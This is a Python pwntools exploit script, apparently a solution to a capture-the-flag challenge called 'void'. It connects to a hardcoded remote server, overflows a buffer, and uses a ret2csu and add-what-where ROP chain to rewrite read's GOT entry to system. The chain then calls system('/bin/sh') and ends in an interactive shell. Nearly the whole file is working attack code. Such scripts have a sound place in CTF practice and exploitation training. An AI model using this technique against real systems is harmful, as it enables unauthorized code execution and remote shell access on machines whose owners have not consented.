#!/usr/bin/env python

from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'

binary_path = "./void"
libc_path = "./libc.so.6"
ld_path = "./ld-linux-x86-64.so.2"

# 0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
add_gadget = 0x0000000000401108


def main():
    p = remote("68.183.37.122", 30120)

    # Calculate some useful values.
    libc_elf = ELF(libc_path)
    elf = ELF(binary_path)
    #p = elf.process()
    #gdb.attach(p, api=True)
    read_got = elf.got['read']
    libc_system = libc_elf.symbols['system']
    libc_read = libc_elf.symbols['read']
    log.info('system@libc: {}'.format(hex(libc_system)))
    log.info('read@libc: {}'.format(hex(libc_read)))
    system_offset = libc_system - libc_read
    log.info('system offset in libc from read: {}'.format(hex(system_offset)))

    # Determine a writable location.
    binsh_addr = elf.bss() + 0x10
    log.info('/bin/sh string Address: {}'.format(hex(binsh_addr)))

    # Construct the chain to use the add-what-where gadget and ret2csu to modify read@got to system.
    rop_chain = ROP(elf)
    # Read the address of read_got to the writable address we control to write the command.
    rop_chain.read(0, binsh_addr)
    rop_chain.raw(rop_chain.ret)
    rop_chain.raw(elf.sym['main'])
    # Send the first stage.
    log.info("Sending the first stage.")
    payload = b'i'*72 + rop_chain.chain()
    payload = payload.ljust(0xc8, b'i')
    p.send(payload)

    # In the second stage, write the command we want to execute.
    # Using just /bin/sh alone seems to end in a segfault after the first command so let's get a
    # nicer shell.
    log.info("Sending the second stage.")
    command = b'/bin/sh'.ljust(0xc8, b'\0')
    p.send(command)


    # Construct the chain to use the add-what-where gadget and ret2csu to modify read@got to system.
    rop_chain = ROP(elf)
    # Setup the registers for the add-what-where. rbp has to account for the -0x3d
    rop_chain.raw(0x4011b2) # Ret2csu
    rop_chain.raw(system_offset) # Rbx
    rop_chain.raw(read_got + 0x3d) # Rbp
    rop_chain.raw(0x13371377)
    rop_chain.raw(0x13371377)
    rop_chain.raw(0x13371377)
    rop_chain.raw(0x13371377)
    #rop_chain.ret2csu(edi=0xdeadbeef, rbx=system_offset, rbp=read_got + 0x3d)
    # Trigger the add-what-where to transform read@got to system.
    rop_chain.raw(add_gadget)
    # Fix up the aligning with a ret.
    rop_chain.raw(rop_chain.ret)
    # Call our system()
    pop_rdi = 0x00000000004011bb
    rop_chain.raw(pop_rdi)
    rop_chain.raw(binsh_addr)
    rop_chain.raw(elf.plt['read'])
    log.info(rop_chain.dump())

    # Send the first stage.
    log.info("Sending the third stage.")
    payload = b'i'*72 + rop_chain.chain()
    p.send(payload)



    # Obtain our shell.
    log.success("Enjoy your shell!")
    p.interactive()


if __name__ == '__main__':
    main()
